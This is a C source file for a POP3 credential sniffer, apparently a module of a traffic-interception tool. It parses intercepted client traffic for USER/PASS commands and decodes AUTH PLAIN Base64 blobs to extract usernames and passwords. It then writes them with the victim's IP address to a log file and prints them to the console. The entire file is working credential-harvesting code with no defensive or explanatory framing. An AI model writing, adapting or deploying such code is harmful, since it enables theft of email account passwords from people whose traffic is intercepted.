#include "pop3_sniffer.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>

// =================== Helpers generales ===================

// Helper function to trim whitespace and newlines
static char* trim(char* str) {
    if (!str) return NULL;

    // Remove trailing whitespace and newlines
    char* end = str + strlen(str) - 1;
    while (end > str && (isspace((unsigned char)*end) || *end == '\r' || *end == '\n')) {
        *end = '\0';
        end--;
    }

    // Remove leading whitespace
    while (*str && isspace((unsigned char)*str)) str++;

    return str;
}

// Helper function to extract value after command (case insensitive)
static char* extract_value(const char* data, const char* command) {
    // Create uppercase versions for case-insensitive search
    char upper_data[1024];
    char upper_command[32];

    strncpy(upper_data, data, sizeof(upper_data) - 1);
    upper_data[sizeof(upper_data) - 1] = '\0';
    strncpy(upper_command, command, sizeof(upper_command) - 1);
    upper_command[sizeof(upper_command) - 1] = '\0';

    for (int i = 0; upper_data[i]; i++) upper_data[i] = (char)toupper((unsigned char)upper_data[i]);
    for (int i = 0; upper_command[i]; i++) upper_command[i] = (char)toupper((unsigned char)upper_command[i]);

    const char* cmd_pos = strstr(upper_data, upper_command);
    if (!cmd_pos) return NULL;

    // Calculate the offset in the original string
    size_t offset = (size_t)(cmd_pos - upper_data);
    const char* original_cmd_pos = data + offset;

    // Move past the command in the original string
    original_cmd_pos += strlen(command);

    // Skip leading whitespace
    while (*original_cmd_pos && isspace((unsigned char)*original_cmd_pos)) original_cmd_pos++;

    if (*original_cmd_pos == '\0') return NULL;

    // Create a copy of the value
    char* value = strdup(original_cmd_pos);
    if (!value) return NULL;

    // Trim the value
    char* trimmed = trim(value);
    if (trimmed != value) {
        memmove(value, trimmed, strlen(trimmed) + 1);
    }

    return value;
}

// =================== Base64 simple para AUTH PLAIN ===================

static int base64_char_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/**
 * Decodifica una cadena Base64 simple (sin saltos de línea).
 * out_buf debe tener suficiente espacio. Devuelve cantidad de bytes decodificados
 * o -1 si hay error.
 */
static int base64_decode(const char *input, unsigned char *out_buf, size_t out_size) {
    size_t len = strlen(input);
    size_t i = 0, j = 0;
    int pad = 0;

    if (len % 4 != 0) {
        return -1; // longitud base64 inválida
    }

    while (i < len) {
        int v[4];
        for (int k = 0; k < 4; k++) {
            char c = input[i++];
            if (c == '=') {
                v[k] = 0;
                pad++;
            } else {
                int val = base64_char_value(c);
                if (val < 0) return -1;
                v[k] = val;
            }
        }

        if (j + 3 > out_size) {
            return -1; // buffer insuficiente
        }

        out_buf[j++] = (unsigned char)((v[0] << 2) | (v[1] >> 4));
        if (pad < 2) {
            out_buf[j++] = (unsigned char)(((v[1] & 0x0F) << 4) | (v[2] >> 2));
        }
        if (pad < 1) {
            out_buf[j++] = (unsigned char)(((v[2] & 0x03) << 6) | v[3]);
        }
    }

    return (int)j;
}

// =================== Logging ===================

static void log_credentials(const char* username, const char* password, const char* ip_origen) {
    FILE *log = fopen("pop3_credentials.log", "a");
    if (log != NULL) {
        time_t now = time(NULL);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));

        fprintf(log, "[%s] POP3 credentials captured from %s -> USER: %s | PASS: %s\n",
                timestamp, ip_origen, username, password);
        fflush(log);  // Ensure data is written immediately
        fclose(log);

        // Also print to stdout for debugging
        printf("[POP3 SNIFFER] Credentials captured from %s: USER=%s, PASS=%s\n",
               ip_origen, username, password);
    } else {
        printf("[POP3 SNIFFER] ERROR: Could not open pop3_credentials.log for writing\n");
    }
}

// =================== API ===================

pop3_state_t *pop3_sniffer_init(void) {
    pop3_state_t *state = (pop3_state_t *)calloc(1, sizeof(pop3_state_t));
    return state;
}

void pop3_sniffer_destroy(pop3_state_t *state) {
    if (state != NULL) {
        free(state);
    }
}

void pop3_sniffer_reset(pop3_state_t *state) {
    if (state != NULL) {
        memset(state, 0, sizeof(*state));
    }
}

// Procesa datos interceptados en una conexión hacia un servidor POP3
void pop3_sniffer_process(pop3_state_t *state, const uint8_t *data, size_t len, const char *ip_origen) {
    if (state == NULL || len == 0 || data == NULL) return;

    // Add data to buffer
    if (state->buffer_len + len >= sizeof(state->buffer)) {
        // Buffer overflow, reset
        state->buffer_len = 0;
    }

    memcpy(state->buffer + state->buffer_len, data, len);
    state->buffer_len += len;
    state->buffer[state->buffer_len] = '\0';

    // Process complete lines
    char* line_start = state->buffer;
    char* line_end;

    while ((line_end = strchr(line_start, '\n')) != NULL) {
        *line_end = '\0';  // Temporarily null-terminate the line

        char* trimmed_line = trim(line_start);
        if (strlen(trimmed_line) > 0) {
            // Convert to uppercase for case-insensitive comparison
            char upper_line[1024];
            strncpy(upper_line, trimmed_line, sizeof(upper_line) - 1);
            upper_line[sizeof(upper_line) - 1] = '\0';

            for (int i = 0; upper_line[i]; i++) {
                upper_line[i] = (char)toupper((unsigned char)upper_line[i]);
            }

            // 1) USER/PASS clásicos
            if (strncmp(upper_line, "USER ", 5) == 0 && !state->user_found) {
                char* username = extract_value(trimmed_line, "USER");
                if (username) {
                    strncpy(state->user, username, sizeof(state->user) - 1);
                    state->user[sizeof(state->user) - 1] = '\0';
                    state->user_found = 1;
                    printf("[POP3 SNIFFER] Found USER: %s\n", state->user);
                    free(username);
                }
            }
            else if (strncmp(upper_line, "PASS ", 5) == 0 && !state->pass_found) {
                char* password = extract_value(trimmed_line, "PASS");
                if (password) {
                    strncpy(state->pass, password, sizeof(state->pass) - 1);
                    state->pass[sizeof(state->pass) - 1] = '\0';
                    state->pass_found = 1;
                    printf("[POP3 SNIFFER] Found PASS: %s\n", state->pass);
                    free(password);
                }
            }
            // 2) AUTH PLAIN (SASL) → siguiente línea es Base64
            else if (strncmp(upper_line, "AUTH PLAIN", 10) == 0) {
                state->waiting_auth_plain_blob = 1;
                printf("[POP3 SNIFFER] Detected AUTH PLAIN, waiting for Base64 blob...\n");
            }
            // 3) Si estamos esperando el blob Base64 de AUTH PLAIN
            else if (state->waiting_auth_plain_blob) {
                unsigned char decoded[512];
                int decoded_len = base64_decode(trimmed_line, decoded, sizeof(decoded));
                if (decoded_len > 0) {
                    // Formato esperado: \0user\0pass
                    int idx = 0;
                    if (decoded[0] == '\0') {
                        idx = 1;
                    }

                    // extraer user
                    int start_user = idx;
                    while (idx < decoded_len && decoded[idx] != '\0') idx++;
                    if (idx >= decoded_len) {
                        // formato raro
                        printf("[POP3 SNIFFER] AUTH PLAIN Base64 decoded but format invalid\n");
                    } else {
                        int user_len = idx - start_user;
                        idx++; // saltamos el '\0'

                        // extraer pass
                        int start_pass = idx;
                        while (idx < decoded_len && decoded[idx] != '\0') idx++;
                        int pass_len = idx - start_pass;

                        if (user_len > 0 && pass_len > 0) {
                            if (!state->user_found) {
                                int copy_len = user_len < (int)sizeof(state->user) - 1 ? user_len : (int)sizeof(state->user) - 1;
                                memcpy(state->user, &decoded[start_user], copy_len);
                                state->user[copy_len] = '\0';
                                state->user_found = 1;
                                printf("[POP3 SNIFFER] AUTH PLAIN USER: %s\n", state->user);
                            }
                            if (!state->pass_found) {
                                int copy_len = pass_len < (int)sizeof(state->pass) - 1 ? pass_len : (int)sizeof(state->pass) - 1;
                                memcpy(state->pass, &decoded[start_pass], copy_len);
                                state->pass[copy_len] = '\0';
                                state->pass_found = 1;
                                printf("[POP3 SNIFFER] AUTH PLAIN PASS: %s\n", state->pass);
                            }
                        } else {
                            printf("[POP3 SNIFFER] AUTH PLAIN decoded but user/pass empty\n");
                        }
                    }
                } else {
                    printf("[POP3 SNIFFER] Failed to decode AUTH PLAIN Base64: '%s'\n", trimmed_line);
                }

                state->waiting_auth_plain_blob = 0;
            }
        }

        line_start = line_end + 1;
    }

    // Si tenemos user y pass, los logueamos
    if (state->user_found && state->pass_found) {
        log_credentials(state->user, state->pass, ip_origen);

        // Reset state for next credentials (misma conexión o futura)
        state->user_found = 0;
        state->pass_found = 0;
        memset(state->user, 0, sizeof(state->user));
        memset(state->pass, 0, sizeof(state->pass));
    }

    // Move remaining data to beginning of buffer
    if (line_start < state->buffer + state->buffer_len) {
        size_t remaining = (size_t)(state->buffer + state->buffer_len - line_start);
        memmove(state->buffer, line_start, remaining);
        state->buffer_len = remaining;
        state->buffer[state->buffer_len] = '\0';
    } else {
        state->buffer_len = 0;
    }
}
